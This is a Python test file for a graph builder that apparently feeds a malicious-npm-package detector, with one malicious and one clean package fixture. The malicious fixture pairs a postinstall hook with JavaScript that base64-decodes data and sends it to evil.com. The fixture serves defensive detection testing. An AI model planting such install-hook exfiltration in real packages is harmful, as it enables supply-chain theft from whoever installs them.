"""Tests for korvyr.graph.cpg_builder."""

import json
import tempfile
from pathlib import Path

from korvyr.graph.cpg_builder import EDGE_TYPE_MAP, build_cpg
from korvyr.parsing.ast_extractor import FEATURE_DIM

EDGE_NAMES = {v: k for k, v in EDGE_TYPE_MAP.items()}


def _print_stats(label: str, data) -> None:
    num_edges = data.edge_index.size(1)
    print(f"\n{'='*60}")
    print(f"  {label}")
    print(f"  num_nodes : {data.num_nodes}")
    print(f"  num_edges : {num_edges}")

    if num_edges:
        breakdown = {name: 0 for name in EDGE_TYPE_MAP}
        for et in data.edge_type.tolist():
            breakdown[EDGE_NAMES[et]] += 1
        for name, count in breakdown.items():
            print(f"    {name:15s}: {count}")

    print(f"  label (y) : {data.y.item()}")
    print(f"  metadata  : {data.metadata.tolist()}")
    meta_names = [
        "has_preinstall_hook", "has_postinstall_hook",
        "num_js_files_norm", "total_lines_norm",
        "has_install_net_hook", "num_sources_norm",
        "num_sinks_norm", "has_source_and_sink",
    ]
    for name, val in zip(meta_names, data.metadata.tolist()):
        print(f"    {name:28s}: {val:.4f}")
    print("=" * 60)


# ------------------------------------------------------------------
# Test 1 — malicious-looking package
# ------------------------------------------------------------------

MALICIOUS_JS = """\
const http = require("http");
const payload = "aGVsbG8gd29ybGQ=";
const decoded = Buffer.from(payload, "base64").toString();
http.get("http://evil.com/?d=" + decoded);
"""

MALICIOUS_PKG_JSON = json.dumps({
    "name": "evil-pkg",
    "version": "1.0.0",
    "scripts": {"postinstall": "node install.js"},
})


def test_malicious_package():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        (root / "package.json").write_text(MALICIOUS_PKG_JSON, encoding="utf-8")
        (root / "install.js").write_text(MALICIOUS_JS, encoding="utf-8")

        data = build_cpg(tmpdir, label=1)
        _print_stats("Malicious package", data)

        assert data is not None

        # x: [num_nodes, FEATURE_DIM]
        assert data.x.dim() == 2
        assert data.x.size(0) == data.num_nodes
        assert data.x.size(1) == FEATURE_DIM

        # edge_index: [2, E] with E > 0
        assert data.edge_index.dim() == 2
        assert data.edge_index.size(0) == 2
        num_edges = data.edge_index.size(1)
        assert num_edges > 0, "expected at least some edges"

        # label
        assert data.y.item() == 1.0

        # metadata shape
        assert data.metadata.shape == (8,)

        # has_postinstall_hook == 1.0
        assert data.metadata[1].item() == 1.0, (
            "metadata[1] (has_postinstall_hook) should be 1.0"
        )

        # has_taint_source_and_sink == 1.0
        assert data.metadata[7].item() == 1.0, (
            "metadata[7] (has_taint_source_and_sink) should be 1.0"
        )


# ------------------------------------------------------------------
# Test 2 — clean package
# ------------------------------------------------------------------

CLEAN_JS = """\
function add(a, b) { return a + b; }
module.exports = { add };
"""

CLEAN_PKG_JSON = json.dumps({
    "name": "clean-pkg",
    "version": "1.0.0",
    "scripts": {"test": "jest"},
})


def test_clean_package():
    with tempfile.TemporaryDirectory() as tmpdir:
        root = Path(tmpdir)
        (root / "package.json").write_text(CLEAN_PKG_JSON, encoding="utf-8")
        (root / "index.js").write_text(CLEAN_JS, encoding="utf-8")

        data = build_cpg(tmpdir, label=0)
        _print_stats("Clean package", data)

        assert data is not None

        # label
        assert data.y.item() == 0.0

        # has_postinstall_hook == 0.0
        assert data.metadata[1].item() == 0.0, (
            "metadata[1] (has_postinstall_hook) should be 0.0"
        )

        # has_taint_source_and_sink == 0.0
        assert data.metadata[7].item() == 0.0, (
            "metadata[7] (has_taint_source_and_sink) should be 0.0"
        )
